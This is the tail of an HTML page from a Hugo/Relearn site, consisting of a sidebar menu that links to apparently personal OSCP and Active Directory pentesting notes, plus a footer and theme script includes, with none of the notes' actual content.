data-nav-url=../../oscp-notes/smb/index.html><a class=padding href=../../oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nfs/index.html><a class=padding href=../../oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ftp/index.html><a class=padding href=../../oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smtp/index.html><a class=padding href=../../oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/snmp/index.html><a class=padding href=../../oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/imap-and-pop/index.html><a class=padding href=../../oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/mssql/index.html><a class=padding href=../../oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/oracle-databases-tns/index.html><a class=padding href=../../oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ipmi/index.html><a class=padding href=../../oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/vhosts/index.html><a class=padding href=../../oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/web-attacks/index.html><a class=padding href=../../oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/xss/index.html><a class=padding href=../../oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=../../oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/crackmapexec/index.html><a class=padding href=../../oscp-notes/crackmapexec/index.html>crackmapexec<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/eum4linux/index.html><a class=padding href=../../oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rpcclient/index.html><a class=padding href=../../oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/spwaning-shell/index.html><a class=padding href=../../oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-windows/index.html><a class=padding href=../../oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=../../oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/transferring-files-with-code/index.html><a class=padding href=../../oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/privilige-escalation/index.html><a class=padding href=../../oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-privilege-escalation/index.html><a class=padding href=../../oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/windows-privilege-escalation/index.html><a class=padding href=../../oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/pivoting_tunneling/index.html><a class=padding href=../../oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=../../oscp-notes/the-active-directory/index.html><a class=padding href=../../oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-metasploit-framework/index.html><a class=padding href=../../oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-remote-management/index.html><a class=padding href=../../oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=../../oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-linux/index.html><a class=padding href=../../oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/password-attacks/index.html><a class=padding href=../../oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li><li data-nav-url=../../ad-pentesting/index.html><input type=checkbox id=R-section-acf7f22c45d9303a8bb9a8ae3a7b966c aria-controls=R-subsections-acf7f22c45d9303a8bb9a8ae3a7b966c><label for=R-section-acf7f22c45d9303a8bb9a8ae3a7b966c><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu AD Pentesting</span></label><a class=padding href=../../ad-pentesting/index.html>AD Pentesting<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-acf7f22c45d9303a8bb9a8ae3a7b966c class=collapsible-menu><li data-nav-url=../../ad-pentesting/windows-pre-2000-abuse/index.html><a class=padding href=../../ad-pentesting/windows-pre-2000-abuse/index.html>Windows Pre 2000 Abuse<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=../../js/js-yaml/js-yaml.min.js?1762287051 defer></script><script src=../../js/d3/d3-color.min.js?1762287051 defer></script><script src=../../js/d3/d3-dispatch.min.js?1762287051 defer></script><script src=../../js/d3/d3-drag.min.js?1762287051 defer></script><script src=../../js/d3/d3-ease.min.js?1762287051 defer></script><script src=../../js/d3/d3-interpolate.min.js?1762287051 defer></script><script src=../../js/d3/d3-selection.min.js?1762287051 defer></script><script src=../../js/d3/d3-timer.min.js?1762287051 defer></script><script src=../../js/d3/d3-transition.min.js?1762287051 defer></script><script src=../../js/d3/d3-zoom.min.js?1762287051 defer></script><script src=../../js/mermaid/mermaid.min.js?1762287051 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=../../js/clipboard/clipboard.min.js?1762287051 defer></script><script src=../../js/perfect-scrollbar/perfect-scrollbar.min.js?1762287051 defer></script><script src=../../js/theme.min.js?1762287051 defer></script></body></html>